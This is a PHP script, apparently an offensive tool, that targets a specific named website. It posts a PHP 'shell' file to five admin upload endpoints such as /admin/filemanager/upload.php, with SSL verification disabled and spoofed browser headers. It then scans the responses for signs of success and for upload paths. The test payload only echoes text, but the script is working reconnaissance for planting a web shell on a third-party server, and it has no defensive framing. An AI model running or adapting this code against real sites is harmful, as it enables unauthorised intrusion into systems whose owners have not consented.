<?php
// Debug Upload Response - Analyze actual server responses
echo "🔍 DEBUG UPLOAD RESPONSE ANALYZER\n";
echo "=================================\n\n";

function makeRequest($url, $method = 'GET', $postData = null, $headers = []) {
    $ch = curl_init();
    
    $defaultHeaders = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive'
    ];
    
    $allHeaders = array_merge($defaultHeaders, $headers);
    
    $curlOptions = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => $allHeaders,
        CURLOPT_HEADER => true,
        CURLOPT_VERBOSE => true
    ];
    
    if ($method === 'POST' && $postData !== null) {
        $curlOptions[CURLOPT_POST] = true;
        $curlOptions[CURLOPT_POSTFIELDS] = $postData;
    }
    
    curl_setopt_array($ch, $curlOptions);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);
    
    $result = [
        'success' => ($response !== false && empty($error)),
        'http_code' => $httpCode,
        'error' => $error,
        'curl_info' => $info
    ];
    
    if ($result['success'] && $response) {
        $headerSize = $info['header_size'];
        $result['headers'] = substr($response, 0, $headerSize);
        $result['body'] = substr($response, $headerSize);
    }
    
    return $result;
}

function analyzeUploadEndpoint($url, $shellContent, $shellName) {
    echo "🎯 ANALYZING: {$url}\n";
    echo str_repeat('-', 50) . "\n";
    
    // Create multipart form data
    $boundary = '----WebKitFormBoundary' . uniqid();
    $data = '';
    
    // Try multiple field names
    $fieldNames = ['file', 'upload', 'userfile', 'attachment', 'document'];
    
    foreach ($fieldNames as $fieldName) {
        echo "Testing field name: {$fieldName}\n";
        
        $data = '';
        $data .= "--{$boundary}\r\n";
        $data .= "Content-Disposition: form-data; name=\"{$fieldName}\"; filename=\"{$shellName}\"\r\n";
        $data .= "Content-Type: application/x-php\r\n\r\n";
        $data .= $shellContent . "\r\n";
        
        // Add common form fields
        $commonFields = [
            'submit' => '1',
            'action' => 'upload',
            'type' => 'file',
            'folder' => '',
            'dir' => '',
            'path' => ''
        ];
        
        foreach ($commonFields as $name => $value) {
            $data .= "--{$boundary}\r\n";
            $data .= "Content-Disposition: form-data; name=\"{$name}\"\r\n\r\n";
            $data .= "{$value}\r\n";
        }
        
        $data .= "--{$boundary}--\r\n";
        
        $headers = [
            'Content-Type: multipart/form-data; boundary=' . $boundary,
            'X-Requested-With: XMLHttpRequest'
        ];
        
        $response = makeRequest($url, 'POST', $data, $headers);
        
        echo "HTTP Code: {$response['http_code']}\n";
        
        if ($response['success'] && !empty($response['body'])) {
            $body = $response['body'];
            $bodyPreview = substr($body, 0, 500);
            
            echo "Response body preview:\n";
            echo str_repeat('=', 30) . "\n";
            echo $bodyPreview . "\n";
            echo str_repeat('=', 30) . "\n";
            
            // Look for success indicators
            $successIndicators = [
                'success', 'uploaded', 'complete', 'done', 'ok', 
                'saved', 'file', $shellName, 'error": false'
            ];
            
            $errorIndicators = [
                'error', 'failed', 'denied', 'forbidden', 'invalid',
                'rejected', 'not allowed', 'upload failed'
            ];
            
            echo "Analysis:\n";
            foreach ($successIndicators as $indicator) {
                if (stripos($body, $indicator) !== false) {
                    echo "✅ Found success indicator: '{$indicator}'\n";
                }
            }
            
            foreach ($errorIndicators as $indicator) {
                if (stripos($body, $indicator) !== false) {
                    echo "❌ Found error indicator: '{$indicator}'\n";
                }
            }
            
            // Try to extract JSON response
            $jsonStart = strpos($body, '{');
            if ($jsonStart !== false) {
                $jsonData = substr($body, $jsonStart);
                $jsonEnd = strrpos($jsonData, '}');
                if ($jsonEnd !== false) {
                    $jsonData = substr($jsonData, 0, $jsonEnd + 1);
                    $decoded = json_decode($jsonData, true);
                    if ($decoded) {
                        echo "JSON Response:\n";
                        print_r($decoded);
                    }
                }
            }
            
            // Look for path information
            preg_match_all('/[\'"]([^\'"]*(uploads?|files?|sources?|media|assets)[^\'"]*)[\'"]/i', $body, $pathMatches);
            if (!empty($pathMatches[1])) {
                echo "Potential paths found:\n";
                foreach (array_unique($pathMatches[1]) as $path) {
                    echo "- {$path}\n";
                }
            }
        }
        
        echo "\n";
        break; // Test only first field name for now
    }
    
    echo "\n";
}

// Test the promising endpoints
$targetUrl = 'http://demo31.phuongnamvina.vn';
$shellName = 'debug_test.php';
$shellContent = '<?php echo "DEBUG TEST - Upload successful at: " . __FILE__ . " on " . date("Y-m-d H:i:s"); ?>';

echo "Target: {$targetUrl}\n";
echo "Shell: {$shellName}\n\n";

$testEndpoints = [
    '/admin/index.php?com=upload',
    '/admin/sources/ajax.php',
    '/admin/filemanager/ajax_calls.php',
    '/admin/filemanager/upload.php',
    '/admin/ajax/upload.php'
];

foreach ($testEndpoints as $endpoint) {
    $fullUrl = $targetUrl . $endpoint;
    analyzeUploadEndpoint($fullUrl, $shellContent, $shellName);
    echo str_repeat('=', 60) . "\n\n";
}

echo "🏁 Debug analysis completed\n";
?> 